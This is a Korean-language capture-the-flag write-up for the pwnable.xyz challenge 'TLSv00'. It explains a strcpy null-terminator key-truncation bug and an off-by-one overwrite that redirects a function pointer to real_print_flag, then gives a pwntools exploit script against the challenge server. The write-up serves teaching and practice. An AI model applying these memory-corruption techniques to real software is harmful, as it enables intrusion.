# [pwnable.xyz] TLSv00

> Transport the flag securely, right?

## Bug

![image](https://github.com/user-attachments/assets/b8b03e26-fee0-44c0-acf5-12945b400d57)

`generate_key()`에서 `s`에 random key를 생성한 후 `strcpy()`로 `key`에 복사한다.

기존의 key보다 1바이트만큼 짧은 key를 생성할 경우, `strcpy()`로 복사할 때 null terminator에 의해 기존의 key의 마지막 1바이트가 사라지게 된다. 이를 이용하면 key의 길이를 1바이트까지 줄일 수 있다.

![image](https://github.com/user-attachments/assets/f7b41aac-15c7-4ee7-a4f5-8de7b2a7accc)

또한, `0x40`바이트짜리 key를 생성할 경우, off-by-one이 발생하여 `do_comment`의 마지막 1바이트를 null byte로 덮어쓸 수 있다.

![image](https://github.com/user-attachments/assets/c27e3e14-5503-4d71-9e56-b1a97f2b1549)

`do_comment`에 있는 `f_do_comment()`의 주소의 마지막 1바이트가 null byte가 되면 `real_print_flag()`의 주소가 된다.

## Exploit

Key를 1바이트로 만든 후 `load_flag()`를 호출하면 flag가 사실상 평문인 상태로 메모리에 올라간다. 그 상태에서 `do_comment`에 `real_print_flag()`의 주소를 넣고 `print_flag()`를 호출하면 플래그를 획득할 수 있다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30006)

sla = r.sendlineafter
sa = r.sendafter


def regen_key(key_len):
    sla(b"> ", b"1")
    sla(b"key len: ", str(key_len).encode())


def load_flag():
    sla(b"> ", b"2")


def print_flag(survey, comment):
    sla(b"> ", b"3")
    sa(b"Wanna take a survey instead? ", survey)
    if survey == b"y":
        sa(b"Enter comment: ", comment)


# write address of real_print_flag() on do_comment
print_flag(b"y", b"a")
regen_key(0x40)


# Decrypt flag
for l in range(0x3F, 0, -1):
    regen_key(l)
load_flag()


# print flag
print_flag(b"n", b"a")


r.interactive()
```

![image](https://github.com/user-attachments/assets/709c3d66-8a91-4012-ada6-aba9d2d93ae9)
